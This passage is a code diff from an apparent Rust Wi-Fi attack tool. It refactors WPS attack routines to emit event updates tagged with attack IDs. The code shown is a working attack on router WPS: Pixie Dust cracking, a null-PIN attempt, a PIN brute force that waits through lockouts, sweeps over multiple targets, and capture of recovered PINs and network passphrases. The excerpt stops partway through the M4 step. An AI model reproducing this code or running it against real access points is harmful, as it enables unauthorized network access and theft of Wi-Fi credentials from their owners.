@@ -32,8 +32,13 @@ use std::thread;
 use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
-use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
+use crate::attacks::next_attack_id;
+use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::chip::ChipCaps;
 use crate::store::Ap;
+use crate::store::update::{
+    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
+};
 use crate::protocol::frames;
 use crate::protocol::ieee80211::{self, fc, fc_flags, ReasonCode, StatusCode};
 use crate::protocol::wps::*;
@@ -241,6 +246,33 @@ impl WpsPhase {
             Self::LockoutWait => "LOCK",
             Self::NullPin => "NULL",
             Self::Done => "DONE",
+        }
+    }
+}
+
+impl WpsPhase {
+    /// Convert to the normalized AttackPhase for delta emission.
+    fn to_attack_phase(&self) -> AttackPhase {
+        match self {
+            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
+            Self::KeyGeneration => AttackPhase { label: "KeyGeneration", is_active: true, is_terminal: false },
+            Self::Authenticating => AttackPhase { label: "Authenticating", is_active: true, is_terminal: false },
+            Self::Associating => AttackPhase { label: "Associating", is_active: true, is_terminal: false },
+            Self::EapIdentity => AttackPhase { label: "EapIdentity", is_active: true, is_terminal: false },
+            Self::WscStart => AttackPhase { label: "WscStart", is_active: true, is_terminal: false },
+            Self::M1Received => AttackPhase { label: "M1Received", is_active: true, is_terminal: false },
+            Self::M2Sent => AttackPhase { label: "M2Sent", is_active: true, is_terminal: false },
+            Self::M3Received => AttackPhase { label: "M3Received", is_active: true, is_terminal: false },
+            Self::M4Sent => AttackPhase { label: "M4Sent", is_active: true, is_terminal: false },
+            Self::PixieCracking => AttackPhase { label: "PixieCracking", is_active: true, is_terminal: false },
+            Self::M5Received => AttackPhase { label: "M5Received", is_active: true, is_terminal: false },
+            Self::M6Sent => AttackPhase { label: "M6Sent", is_active: true, is_terminal: false },
+            Self::M7Received => AttackPhase { label: "M7Received", is_active: true, is_terminal: false },
+            Self::BruteForcePhase1 => AttackPhase { label: "BruteForcePhase1", is_active: true, is_terminal: false },
+            Self::BruteForcePhase2 => AttackPhase { label: "BruteForcePhase2", is_active: true, is_terminal: false },
+            Self::LockoutWait => AttackPhase { label: "LockoutWait", is_active: true, is_terminal: false },
+            Self::NullPin => AttackPhase { label: "NullPin", is_active: true, is_terminal: false },
+            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
         }
     }
 }
@@ -1081,6 +1113,18 @@ fn run_wps_multi(
     tx_fb: &crate::core::TxFeedback,
 ) {
     let attack_start = Instant::now();
+    let attack_id = next_attack_id();
+
+    // Emit AttackStarted — first target info for the initial delta
+    if let Some(first) = targets.first() {
+        shared.emit_updates(vec![StoreUpdate::AttackStarted {
+            id: attack_id,
+            attack_type: AttackType::Wps,
+            target_bssid: first.bssid,
+            target_ssid: first.ssid.clone(),
+            target_channel: first.channel,
+        }]);
+    }
 
     for (idx, target) in targets.iter().enumerate() {
         if !running.load(Ordering::SeqCst) { break; }
@@ -1129,22 +1173,22 @@ fn run_wps_multi(
             i.tx_feedback = tx_fb.snapshot();
         }
 
-        push_event(events, attack_start, WpsEventKind::TargetStarted {
+        push_event(shared, events, attack_start, WpsEventKind::TargetStarted {
             bssid: target.bssid,
             ssid: target.ssid.clone(),
             channel: target.channel,
             index: idx as u32 + 1,
             total: targets.len() as u32,
-        });
+        }, attack_id);
 
         // Run single target attack
         let target_start = Instant::now();
-        run_wps_attack_single(shared, reader, target, params, info, events, running, skip_attack, attack_start);
+        run_wps_attack_single(shared, reader, target, params, info, events, running, skip_attack, attack_start, attack_id);
         let target_elapsed = target_start.elapsed();
 
         // Check skip_target signal
         if skip_target.load(Ordering::SeqCst) {
-            push_event(events, attack_start, WpsEventKind::TargetSkipped { idx: idx + 1 });
+            push_event(shared, events, attack_start, WpsEventKind::TargetSkipped { idx: idx + 1 }, attack_id);
         }
 
         // Collect result
@@ -1166,12 +1210,15 @@ fn run_wps_multi(
 
         let is_success = result.status == WpsStatus::Success;
 
-        push_event(events, attack_start, WpsEventKind::TargetComplete {
+        push_event(shared, events, attack_start, WpsEventKind::TargetComplete {
             bssid: target.bssid,
             ssid: target.ssid.clone(),
             status: result.status,
             elapsed_ms: target_elapsed.as_millis() as u64,
-        });
+        }, attack_id);
+
+        // Emit counters after each target (natural batch point)
+        emit_counters(shared, attack_id, info, attack_start, tx_fb);
 
         {
             let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -1194,16 +1241,32 @@ fn run_wps_multi(
         };
         i.final_result = Some(final_result);
         i.elapsed = attack_start.elapsed();
+        let elapsed_secs = i.elapsed.as_secs_f64();
+        if elapsed_secs > 0.0 {
+            i.frames_per_sec = i.frames_sent as f64 / elapsed_secs;
+        }
         i.tx_feedback = tx_fb.snapshot();
     }
 
     // Final summary event
     let final_info = info.lock().unwrap_or_else(|e| e.into_inner()).clone();
-    push_event(events, attack_start, WpsEventKind::AttackComplete {
+    push_event(shared, events, attack_start, WpsEventKind::AttackComplete {
         status: if final_info.success_count > 0 { WpsStatus::Success } else { final_info.status },
         elapsed: attack_start.elapsed(),
         attempts: final_info.results_count,
-    });
+    }, attack_id);
+
+    // Emit AttackComplete with final results
+    shared.emit_updates(vec![StoreUpdate::AttackComplete {
+        id: attack_id,
+        attack_type: AttackType::Wps,
+        result: AttackResult::Wps {
+            pin_found: final_info.pin_found,
+            psk_found: final_info.psk_found,
+            attempts: final_info.results.iter().map(|r| r.attempts).sum(),
+            results: final_info.results,
+        },
+    }]);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1220,40 +1283,38 @@ fn run_wps_attack_single(
     running: &Arc<AtomicBool>,
     skip_attack: &Arc<AtomicBool>,
     start: Instant,
+    attack_id: AttackId,
 ) {
     let our_mac = shared.mac();
     let bssid = target.bssid;
     let channel = target.channel;
 
-    // TX options optimized for range — own MAC so ACK feedback works
-    let tx_opts = TxOptions {
-        rate: if channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
-        retries: 12,
-        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
-        ..Default::default()
-    };
+    // TX options: max range + ACK feedback, chip-aware rate selection
+    let has_he = shared.caps().contains(ChipCaps::HE);
+    let tx_opts = TxOptions::max_range_ack(channel, has_he);
 
     // Lock channel
     if channel > 0 {
         if let Err(e) = shared.lock_channel(channel, "wps") {
-            push_event(events, start, WpsEventKind::Error {
+            push_event(shared, events, start, WpsEventKind::Error {
                 message: format!("Channel lock failed: {}", e),
-            });
+            }, attack_id);
             set_status(info, WpsStatus::Error);
             return;
         }
-        push_event(events, start, WpsEventKind::ChannelLocked {
+        push_event(shared, events, start, WpsEventKind::ChannelLocked {
             channel,
-        });
+        }, attack_id);
         if params.channel_settle > Duration::ZERO {
             thread::sleep(params.channel_settle);
         }
+
     }
 
     // Generate DH keypair.
     // For multi-exchange modes (ComputedPin, Auto, BruteForce), use fast 32-byte keys.
     // For single-exchange modes (PixieDust, NullPin), use full 192-byte keys.
-    set_phase(info, WpsPhase::KeyGeneration);
+    set_phase(shared, info, WpsPhase::KeyGeneration, attack_id);
     set_detail(info, "Generating 1536-bit DH keypair (modular exponentiation)...");
     let keygen_start = Instant::now();
 
@@ -1267,18 +1328,18 @@ fn run_wps_attack_single(
     let (privkey, pubkey) = match dh_result {
         Some((priv_k, pub_k)) => (priv_k, pub_k),
         None => {
-            push_event(events, start, WpsEventKind::Error {
+            push_event(shared, events, start, WpsEventKind::Error {
                 message: "DH keypair generation failed".to_string(),
-            });
+            }, attack_id);
             set_status(info, WpsStatus::Error);
             shared.unlock_channel();
             return;
         }
     };
 
-    push_event(events, start, WpsEventKind::KeyGenerated {
+    push_event(shared, events, start, WpsEventKind::KeyGenerated {
         elapsed_ms: keygen_start.elapsed().as_millis() as u64,
-    });
+    }, attack_id);
 
     if !running.load(Ordering::SeqCst) {
         set_status(info, WpsStatus::Stopped);
@@ -1296,26 +1357,26 @@ fn run_wps_attack_single(
     match params.attack_type {
         WpsAttackType::PixieDust => {
             run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                target.capability, &target.supported_rates);
+                target.capability, &target.supported_rates, attack_id);
 
             // After Pixie Dust, also try Null PIN if we reached M3 (AP is responsive)
             let status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
             if matches!(status, WpsStatus::PixieDataOnly) && running.load(Ordering::SeqCst) {
                 run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                    target.capability, &target.supported_rates);
+                    target.capability, &target.supported_rates, attack_id);
             }
         }
         WpsAttackType::BruteForce => {
             run_brute_force(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                target.capability, &target.supported_rates);
+                target.capability, &target.supported_rates, attack_id);
         }
         WpsAttackType::NullPin => {
             run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                target.capability, &target.supported_rates);
+                target.capability, &target.supported_rates, attack_id);
         }
         WpsAttackType::ComputedPin => {
             run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                target.capability, &target.supported_rates, &None);
+                target.capability, &target.supported_rates, &None, attack_id);
         }
         WpsAttackType::Auto => {
             // Smart chain: ComputedPin → PixieDust → NullPin
@@ -1351,13 +1412,13 @@ fn run_wps_attack_single(
             push_sub(info, "Computed PINs", true);
             let sub_start = Instant::now();
             run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                target.capability, &target.supported_rates, &None);
+                target.capability, &target.supported_rates, &None, attack_id);
             let sub_elapsed = sub_start.elapsed();
 
             let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
             if skip_attack.load(Ordering::SeqCst) {
                 finish_sub(info, WpsStatus::Stopped, "skipped", sub_elapsed);
-                push_event(events, start, WpsEventKind::AttackSkipped { attack_type: "Computed PIN".to_string() });
+                push_event(shared, events, start, WpsEventKind::AttackSkipped { attack_type: "Computed PIN".to_string() }, attack_id);
             } else if matches!(cur_status, WpsStatus::Success) {
                 finish_sub(info, WpsStatus::Success, "PIN matched!", sub_elapsed);
             } else {
@@ -1377,13 +1438,13 @@ fn run_wps_attack_single(
                 push_sub(info, "Pixie Dust", true);
                 let sub_start = Instant::now();
                 run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                    target.capability, &target.supported_rates);
+                    target.capability, &target.supported_rates, attack_id);
                 let sub_elapsed = sub_start.elapsed();
 
                 let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
                 if skip_attack.load(Ordering::SeqCst) {
                     finish_sub(info, WpsStatus::Stopped, "skipped", sub_elapsed);
-                    push_event(events, start, WpsEventKind::AttackSkipped { attack_type: "Pixie Dust".to_string() });
+                    push_event(shared, events, start, WpsEventKind::AttackSkipped { attack_type: "Pixie Dust".to_string() }, attack_id);
                 } else if matches!(cur_status, WpsStatus::Success) {
                     finish_sub(info, WpsStatus::Success, "PIN cracked!", sub_elapsed);
                 } else {
@@ -1403,7 +1464,7 @@ fn run_wps_attack_single(
                 push_sub(info, "Null PIN", true);
                 let sub_start = Instant::now();
                 run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
-                    target.capability, &target.supported_rates);
+                    target.capability, &target.supported_rates, attack_id);
                 let sub_elapsed = sub_start.elapsed();
 
                 let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
@@ -1444,13 +1505,14 @@ fn run_pixie_dust(
     tx_opts: &TxOptions,
     ap_capability: u16,
     ap_rates: &[u8],
+    attack_id: AttackId,
 ) {
     session.pin = "12345670".to_string(); // default PIN for Pixie Dust exchange
 
     // Run exchange to M4 (we only need M4 for Pixie Dust)
     let result = wps_single_exchange(
         shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 0,
-        ap_capability, ap_rates,
+        ap_capability, ap_rates, attack_id,
     );
 
     match result {
@@ -1460,27 +1522,27 @@ fn run_pixie_dust(
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.has_pixie_data = true;
             }
-            push_event(events, start, WpsEventKind::PixieDataExtracted {
+            push_event(shared, events, start, WpsEventKind::PixieDataExtracted {
                 has_r_s1: true, // We're Registrar — we always know R-S1
-            });
+            }, attack_id);
 
             // Offline crack
-            set_phase(info, WpsPhase::PixieCracking);
+            set_phase(shared, info, WpsPhase::PixieCracking, attack_id);
             set_detail(info, "Running Pixie Dust offline crack (testing PRNG modes)...");
-            push_event(events, start, WpsEventKind::PixieCrackStarted);
+            push_event(shared, events, start, WpsEventKind::PixieCrackStarted, attack_id);
 
             let crack_start = Instant::now();
-            if let Some((pin, mode)) = pixie_crack_enhanced(session, events, start) {
-                push_event(events, start, WpsEventKind::PixieCrackSuccess {
+            if let Some((pin, mode)) = pixie_crack_enhanced(session, shared, events, start, attack_id) {
+                push_event(shared, events, start, WpsEventKind::PixieCrackSuccess {
                     pin: pin.clone(),
                     elapsed_ms: crack_start.elapsed().as_millis() as u64,
-                });
+                }, attack_id);
                 let _ = mode; // mode already logged via PixiePrngRecovered event
                 set_status(info, WpsStatus::Success);
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.pin_found = Some(pin);
             } else {
-                push_event(events, start, WpsEventKind::PixieCrackFailed);
+                push_event(shared, events, start, WpsEventKind::PixieCrackFailed, attack_id);
                 set_status(info, WpsStatus::PixieDataOnly);
             }
         }
@@ -1496,7 +1558,7 @@ fn run_pixie_dust(
 
     // Cleanup: send NACK + disassoc
     send_nack(shared, session, &bssid, tx_opts, info, events, start);
-    send_disassoc(shared, bssid, tx_opts, info, events, start);
+    send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1517,19 +1579,20 @@ fn run_null_pin(
     tx_opts: &TxOptions,
     ap_capability: u16,
     ap_rates: &[u8],
+    attack_id: AttackId,
 ) {
     session.reset_for_new_attempt();
     session.pin = "00000000".to_string();
 
-    push_event(events, start, WpsEventKind::PinAttempt {
+    push_event(shared, events, start, WpsEventKind::PinAttempt {
         pin: "00000000".to_string(),
         attempt: 1,
-    });
-    set_phase(info, WpsPhase::NullPin);
+    }, attack_id);
+    set_phase(shared, info, WpsPhase::NullPin, attack_id);
 
     let result = wps_single_exchange(
         shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 2,
-        ap_capability, ap_rates,
+        ap_capability, ap_rates, attack_id,
     );
 
     match result {
@@ -1538,13 +1601,13 @@ fn run_null_pin(
             let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
             i.pin_found = Some("00000000".to_string());
             i.psk_found = Some(psk.clone());
-            push_event(events, start, WpsEventKind::PinSuccess {
+            push_event(shared, events, start, WpsEventKind::PinSuccess {
                 pin: "00000000".to_string(),
                 psk,
-            });
+            }, attack_id);
         }
         _ => {
-            push_event(events, start, WpsEventKind::NullPinFailed);
+            push_event(shared, events, start, WpsEventKind::NullPinFailed, attack_id);
             // Don't overwrite specific failure statuses set by wps_single_exchange
             let current = info.lock().unwrap_or_else(|e| e.into_inner()).status;
             if matches!(current, WpsStatus::InProgress) {
@@ -1553,7 +1616,7 @@ fn run_null_pin(
         }
     }
 
-    send_disassoc(shared, bssid, tx_opts, info, events, start);
+    send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1574,6 +1637,7 @@ fn run_brute_force(
     tx_opts: &TxOptions,
     ap_capability: u16,
     ap_rates: &[u8],
+    attack_id: AttackId,
 ) {
     let max_attempts = if params.max_attempts > 0 { params.max_attempts } else { 11000 };
 
@@ -1599,10 +1663,10 @@ fn run_brute_force(
 
     // ── Phase 1: Find first 4 digits ──
     if found_half1.is_none() {
-        set_phase(info, WpsPhase::BruteForcePhase1);
-        push_event(events, start, WpsEventKind::BruteForcePhase1Started {
+        set_phase(shared, info, WpsPhase::BruteForcePhase1, attack_id);
+        push_event(shared, events, start, WpsEventKind::BruteForcePhase1Started {
             total: 10000 - start_half1 as u32,
-        });
+        }, attack_id);
 
         for h1 in start_half1..10000 {
             if !running.load(Ordering::SeqCst) || attempts >= max_attempts {
@@ -1621,14 +1685,14 @@ fn run_brute_force(
                 i.elapsed = start.elapsed();
             }
 
-            push_event(events, start, WpsEventKind::PinAttempt {
+            push_event(shared, events, start, WpsEventKind::PinAttempt {
                 pin: pin.clone(),
                 attempt: attempts,
-            });
+            }, attack_id);
 
             let result = wps_single_exchange(
                 shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 1,
-                ap_capability, ap_rates,
+                ap_capability, ap_rates, attack_id,
             );
             attempts += 1;
 
@@ -1638,27 +1702,27 @@ fn run_brute_force(
                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                     i.half1_found = true;
                     i.half1_pin = format!("{:04}", h1);
-                    push_event(events, start, WpsEventKind::Half1Found {
+                    push_event(shared, events, start, WpsEventKind::Half1Found {
                         half1: format!("{:04}", h1),
                         attempts,
-                    });
+                    }, attack_id);
                     break;
                 }
                 ExchangeResult::Locked => {
                     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                     i.lockouts_detected += 1;
-                    push_event(events, start, WpsEventKind::LockoutDetected {
+                    push_event(shared, events, start, WpsEventKind::LockoutDetected {
                         config_error: 15,
                         delay: params.lockout_delay,
-                    });
-                    set_phase(info, WpsPhase::LockoutWait);
+                    }, attack_id);
+                    set_phase(shared, info, WpsPhase::LockoutWait, attack_id);
                     // Wait through lockout
                     let wait_end = Instant::now() + params.lockout_delay;
                     while Instant::now() < wait_end && running.load(Ordering::SeqCst) {
                         thread::sleep(Duration::from_secs(1));
                     }
-                    push_event(events, start, WpsEventKind::LockoutWaitComplete);
-                    set_phase(info, WpsPhase::BruteForcePhase1);
+                    push_event(shared, events, start, WpsEventKind::LockoutWaitComplete, attack_id);
+                    set_phase(shared, info, WpsPhase::BruteForcePhase1, attack_id);
                 }
                 ExchangeResult::Stopped => {
                     set_status(info, WpsStatus::Stopped);
@@ -1666,15 +1730,15 @@ fn run_brute_force(
                 }
                 _ => {
                     // Wrong PIN or error — continue
-                    push_event(events, start, WpsEventKind::PinRejected {
+                    push_event(shared, events, start, WpsEventKind::PinRejected {
                         pin: pin.clone(),
                         half: 1,
-                    });
+                    }, attack_id);
                 }
             }
 
             // Cleanup + delay between attempts
-            send_disassoc(shared, bssid, tx_opts, info, events, start);
+            send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
             if running.load(Ordering::SeqCst) && h1 + 1 < 10000 {
                 thread::sleep(params.delay_between_attempts);
             }
@@ -1695,11 +1759,11 @@ fn run_brute_force(
     };
 
     // ── Phase 2: Find last 3 digits + checksum ──
-    set_phase(info, WpsPhase::BruteForcePhase2);
-    push_event(events, start, WpsEventKind::BruteForcePhase2Started {
+    set_phase(shared, info, WpsPhase::BruteForcePhase2, attack_id);
+    push_event(shared, events, start, WpsEventKind::BruteForcePhase2Started {
         half1: format!("{:04}", half1),
         total: 1000 - start_half2 as u32,
-    });
+    }, attack_id);
 
     for h2 in start_half2..1000 {
         if !running.load(Ordering::SeqCst) || attempts >= max_attempts {
@@ -1718,14 +1782,14 @@ fn run_brute_force(
             i.elapsed = start.elapsed();
         }
 
-        push_event(events, start, WpsEventKind::PinAttempt {
+        push_event(shared, events, start, WpsEventKind::PinAttempt {
             pin: pin.clone(),
             attempt: attempts,
-        });
+        }, attack_id);
 
         let result = wps_single_exchange(
             shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 2,
-            ap_capability, ap_rates,
+            ap_capability, ap_rates, attack_id,
         );
         attempts += 1;
 
@@ -1735,37 +1799,37 @@ fn run_brute_force(
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.pin_found = Some(pin.clone());
                 i.psk_found = Some(psk.clone());
-                push_event(events, start, WpsEventKind::PinSuccess { pin, psk });
+                push_event(shared, events, start, WpsEventKind::PinSuccess { pin, psk }, attack_id);
                 return;
             }
             ExchangeResult::Locked => {
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.lockouts_detected += 1;
-                push_event(events, start, WpsEventKind::LockoutDetected {
+                push_event(shared, events, start, WpsEventKind::LockoutDetected {
                     config_error: 15,
                     delay: params.lockout_delay,
-                });
-                set_phase(info, WpsPhase::LockoutWait);
+                }, attack_id);
+                set_phase(shared, info, WpsPhase::LockoutWait, attack_id);
                 let wait_end = Instant::now() + params.lockout_delay;
                 while Instant::now() < wait_end && running.load(Ordering::SeqCst) {
                     thread::sleep(Duration::from_secs(1));
                 }
-                push_event(events, start, WpsEventKind::LockoutWaitComplete);
-                set_phase(info, WpsPhase::BruteForcePhase2);
+                push_event(shared, events, start, WpsEventKind::LockoutWaitComplete, attack_id);
+                set_phase(shared, info, WpsPhase::BruteForcePhase2, attack_id);
             }
             ExchangeResult::Stopped => {
                 set_status(info, WpsStatus::Stopped);
                 return;
             }
             _ => {
-                push_event(events, start, WpsEventKind::PinRejected {
+                push_event(shared, events, start, WpsEventKind::PinRejected {
                     pin: pin.clone(),
                     half: 2,
-                });
+                }, attack_id);
             }
         }
 
-        send_disassoc(shared, bssid, tx_opts, info, events, start);
+        send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
         if running.load(Ordering::SeqCst) && h2 + 1 < 1000 {
             thread::sleep(params.delay_between_attempts);
         }
@@ -1834,10 +1898,11 @@ fn wps_single_exchange(
     depth: u8,
     ap_capability: u16,
     ap_rates: &[u8],
+    attack_id: AttackId,
 ) -> ExchangeResult {
 
     // ── Auth (Open System) ──
-    set_phase(info, WpsPhase::Authenticating);
+    set_phase(shared, info, WpsPhase::Authenticating, attack_id);
     let mut auth_ok = false;
     for attempt in 0..=params.auth_retries {
         if !running.load(Ordering::SeqCst) { return ExchangeResult::Stopped; }
@@ -1868,7 +1933,7 @@ fn wps_single_exchange(
                 if body.status == 0 && body.seq == 2 {
                     auth_ok = true;
                     set_detail(info, "Auth response received — authenticated");
-                    push_event(events, start, WpsEventKind::AuthSuccess { bssid });
+                    push_event(shared, events, start, WpsEventKind::AuthSuccess { bssid }, attack_id);
                     break;
                 }
             }
@@ -1877,12 +1942,12 @@ fn wps_single_exchange(
 
     if !auth_ok {
         set_detail(info, &format!("AUTH failed after {} attempts", params.auth_retries + 1));
-        push_event(events, start, WpsEventKind::AuthFailed { bssid, attempt: params.auth_retries });
+        push_event(shared, events, start, WpsEventKind::AuthFailed { bssid, attempt: params.auth_retries }, attack_id);
         return ExchangeResult::AuthFailed;
     }
 
     // ── Assoc with WPS IE ──
-    set_phase(info, WpsPhase::Associating);
+    set_phase(shared, info, WpsPhase::Associating, attack_id);
     set_detail(info, "Sending association request with WPS IE...");
     let mut assoc_ok = false;
     let wps_ie = build_wps_assoc_ie();
@@ -1927,7 +1992,7 @@ fn wps_single_exchange(
                 if body.status == 0 {
                     assoc_ok = true;
                     set_detail(info, "Associated with WPS IE");
-                    push_event(events, start, WpsEventKind::AssocSuccess { bssid });
+                    push_event(shared, events, start, WpsEventKind::AssocSuccess { bssid }, attack_id);
                     break;
                 }
             }
@@ -1936,7 +2001,7 @@ fn wps_single_exchange(
 
     if !assoc_ok {
         set_detail(info, &format!("ASSOC failed after {} attempts", params.assoc_retries + 1));
-        push_event(events, start, WpsEventKind::AssocFailed { bssid, attempt: params.assoc_retries });
+        push_event(shared, events, start, WpsEventKind::AssocFailed { bssid, attempt: params.assoc_retries }, attack_id);
         return ExchangeResult::AssocFailed;
     }
 
@@ -1954,7 +2019,7 @@ fn wps_single_exchange(
     //  Identity Requests before processing our response — we just resend.
     // ═══════════════════════════════════════════════════════════════════
 
-    set_phase(info, WpsPhase::EapIdentity);
+    set_phase(shared, info, WpsPhase::EapIdentity, attack_id);
     set_detail_wait(info, "Waiting for EAP Identity Request", params.eap_timeout);
     let mut id_response_sent = false;
     let mut _wsc_start_received = false;
@@ -1987,7 +2052,7 @@ fn wps_single_exchange(
 
         // EAP-Failure (code 4)
         if eap_code == 4 {
-            push_event(events, start, WpsEventKind::EapFailure);
+            push_event(shared, events, start, WpsEventKind::EapFailure, attack_id);
             return ExchangeResult::Locked;
         }
 
@@ -1997,14 +2062,14 @@ fn wps_single_exchange(
                 opcode::WSC_START => {
                     // AP sent WSC_Start — it's ready for the exchange
                     _wsc_start_received = true;
-                    set_phase(info, WpsPhase::WscStart);
+                    set_phase(shared, info, WpsPhase::WscStart, attack_id);
                     set_detail(info, "WSC_Start received — waiting for M1...");
-                    push_event(events, start, WpsEventKind::WscStartReceived);
+                    push_event(shared, events, start, WpsEventKind::WscStartReceived, attack_id);
                     continue; // now wait for M1
                 }
                 opcode::WSC_MSG => {
                     // This should be M1 from the AP
-                    set_phase(info, WpsPhase::M1Received);
+                    set_phase(shared, info, WpsPhase::M1Received, attack_id);
                     set_detail(info, "M1 received — parsing AP device info + public key...");
                     // Dump M1 TLVs for protocol debugging
                     {
@@ -2021,17 +2086,17 @@ fn wps_single_exchange(
                         }
                     }
                     if !session.parse_m1(wsc.body) { return ExchangeResult::M1Failed; }
-                    push_event(events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M1 });
+                    push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M1 }, attack_id);
 
                     // Emit AP device info
                     let di = &session.ap_device_info;
-                    push_event(events, start, WpsEventKind::ApDeviceInfo {
+                    push_event(shared, events, start, WpsEventKind::ApDeviceInfo {
                         manufacturer: di.manufacturer.clone(),
                         model_name: di.model_name.clone(),
                         model_number: di.model_number.clone(),
                         serial_number: di.serial_number.clone(),
                         device_name: di.device_name.clone(),
-                    });
+                    }, attack_id);
                     {
                         let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                         i.ap_manufacturer = di.manufacturer.clone();
@@ -2045,7 +2110,7 @@ fn wps_single_exchange(
                 }
                 opcode::WSC_NACK => {
                     if let Some(ce) = extract_config_error(wsc.body) {
-                        push_event(events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) });
+                        push_event(shared, events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) }, attack_id);
                         if ce == 15 || ce == 18 { return ExchangeResult::Locked; }
                     }
                     return ExchangeResult::M1Failed;
@@ -2080,9 +2145,9 @@ fn wps_single_exchange(
                 inc_frames_sent(info);
                 if !id_response_sent {
                     set_detail(info, "Sending EAP Identity: WFA-SimpleConfig-Registrar-1-0");
-                    push_event(events, start, WpsEventKind::EapIdentitySent);
+                    push_event(shared, events, start, WpsEventKind::EapIdentitySent, attack_id);
                     id_response_sent = true;
-                    set_phase(info, WpsPhase::WscStart);
+                    set_phase(shared, info, WpsPhase::WscStart, attack_id);
                 }
                 continue; // keep looping for WSC_Start/M1
             }
@@ -2099,14 +2164,14 @@ fn wps_single_exchange(
     }
 
     // ── Send M2 (registrar nonce, PKr) ──
-    set_phase(info, WpsPhase::M2Sent);
+    set_phase(shared, info, WpsPhase::M2Sent, attack_id);
     set_detail(info, "Deriving AuthKey + KeyWrapKey from DH exchange...");
 
     // Derive keys: DH shared secret from PKe + our privkey
     let enrollee_mac = session.ap_device_info.mac_address.unwrap_or(*bssid.as_bytes());
     session.derive_keys(&enrollee_mac);
     if !session.has_keys { return ExchangeResult::M1Failed; }
-    push_event(events, start, WpsEventKind::KeysDerived);
+    push_event(shared, events, start, WpsEventKind::KeysDerived, attack_id);
     set_detail(info, "Keys derived — building M2 with registrar nonce + PKr...");
 
     let m2_body = match session.build_m2_body(params) {
@@ -2132,7 +2197,7 @@ fn wps_single_exchange(
     let m2_frame = build_data_frame(&bssid, &session.our_mac, &m2_eap);
     let _ = shared.tx_frame(&m2_frame, tx_opts);
     inc_frames_sent(info);
-    push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M2 });
+    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M2 }, attack_id);
     set_detail_wait(info, "M2 sent \u{2014} waiting for M3 (E-Hash1, E-Hash2)", params.eap_timeout);
 
     // ── Receive M3 from AP (E-Hash1, E-Hash2) ──
@@ -2140,7 +2205,7 @@ fn wps_single_exchange(
     // In single-adapter mode, feed_from can duplicate frames, causing
     // leftover M1/WSC_Start to be picked up as false M3 matches.
     reader.drain();
-    set_phase(info, WpsPhase::M3Received);
+    set_phase(shared, info, WpsPhase::M3Received, attack_id);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
         None => return ExchangeResult::M3Failed,
@@ -2149,7 +2214,7 @@ fn wps_single_exchange(
     if let Some(wsc) = parse_eap_wsc(&eap_data) {
         if wsc.op_code == opcode::WSC_NACK {
             if let Some(ce) = extract_config_error(wsc.body) {
-                push_event(events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) });
+                push_event(shared, events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) }, attack_id);
                 if ce == 15 || ce == 18 { return ExchangeResult::Locked; }
             }
             return ExchangeResult::M3Failed;
@@ -2159,7 +2224,7 @@ fn wps_single_exchange(
         session.eap_id = eap_data[1];
 
         if !session.parse_m3(wsc.body) { return ExchangeResult::M3Failed; }
-        push_event(events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M3 });
+        push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M3 }, attack_id);
     } else {
         return ExchangeResult::M3Failed;
     }
@@ -2170,7 +2235,7 @@ fn wps_single_exchange(
     }
 
     // ── Send M4 (R-Hash1, R-Hash2, encrypted R-S1) ──
